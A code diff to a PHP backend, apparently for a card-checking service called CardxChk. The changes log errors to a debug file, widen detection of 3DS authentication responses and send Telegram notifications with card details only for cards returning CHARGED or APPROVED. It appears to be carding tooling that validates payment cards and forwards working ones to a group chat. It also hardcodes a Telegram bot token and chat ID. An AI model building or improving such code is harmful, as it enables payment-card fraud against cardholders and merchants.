@@ -149,7 +149,7 @@ session_start([
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
-    log_message('Error 401: ' . json_encode($errorMsg));
+    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
     echo json_encode($errorMsg);
     exit;
 }
@@ -159,7 +159,7 @@ if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegra
 if (!$validation['valid']) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    log_message('Error 401: ' . json_encode($errorMsg));
+    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
     echo json_encode($errorMsg);
     exit;
 }
@@ -169,7 +169,7 @@ if (!$validation['valid']) {
 if ($providedApiKey !== $expectedApiKey) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    log_message('Error 401: ' . json_encode($errorMsg));
+    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
     echo json_encode($errorMsg);
     exit;
 }
@@ -178,13 +178,27 @@ if ($providedApiKey !== $expectedApiKey) {
 ini_set('display_errors', 0);
 error_reporting(E_ALL);
 
+// Optional file-based logging for debugging
+ $log_file = __DIR__ . '/paypal0.1$_debug.log';
+function log_message($message) {
+    global $log_file;
+    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
+}
+
+// Track sent notifications to prevent duplicates
+ $sent_notifications = [];
+
 // Function to check for 3DS responses
 function is3DAuthenticationResponse($response) {
     $responseUpper = strtoupper($response);
     return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
            strpos($responseUpper, '3DS') !== false ||
            strpos($responseUpper, 'THREE_D_SECURE') !== false ||
-           strpos($responseUpper, 'REDIRECT') !== false;
+           strpos($responseUpper, 'REDIRECT') !== false ||
+           strpos($responseUpper, 'VERIFICATION_REQUIRED') !== false ||
+           strpos($responseUpper, 'ADDITIONAL_AUTHENTICATION') !== false ||
+           strpos($responseUpper, 'AUTHENTICATION_REQUIRED') !== false ||
+           strpos($responseUpper, 'CHALLENGE_REQUIRED') !== false;
 }
 
 // Function to format response (remove status prefix and brackets)
@@ -201,18 +215,39 @@ function formatResponse($response) {
 }
 
 // Function to send Telegram notification
-function sendTelegramNotification($card_details, $status, $response) {
+function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
+    global $sent_notifications;
+    
+    // Create a unique key for this card to prevent duplicates
+    $notification_key = md5($card_details . $status . $response);
+    
+    // Check if we've already sent this notification
+    if (isset($sent_notifications[$notification_key])) {
+        log_message("Skipping duplicate notification for $card_details: $status");
+        return;
+    }
+    
+    // Mark this notification as sent
+    $sent_notifications[$notification_key] = true;
+    
+    // Check both formatted response and original API response for 3DS
+    $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
+    if (is3DAuthenticationResponse($checkResponse)) {
+        log_message("Skipping Telegram notification for 3DS response: $checkResponse");
+        return;
+    }
+    
+    // Only proceed if status is CHARGED or APPROVED
+    if ($status !== 'CHARGED' && $status !== 'APPROVED') {
+        log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
+        return;
+    }
+
     // Load Telegram Bot Token from environment (secure storage)
     $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
     $chat_id = '-1003204998888'; // Your group chat ID
     $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
     $site_link = 'https://cxchk.site';
-
-    // Skip 3DS responses
-    if (is3DAuthenticationResponse($response)) {
-        log_message("Skipping Telegram notification for 3DS response: $response");
-        return;
-    }
 
     // Get user info from session
     $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
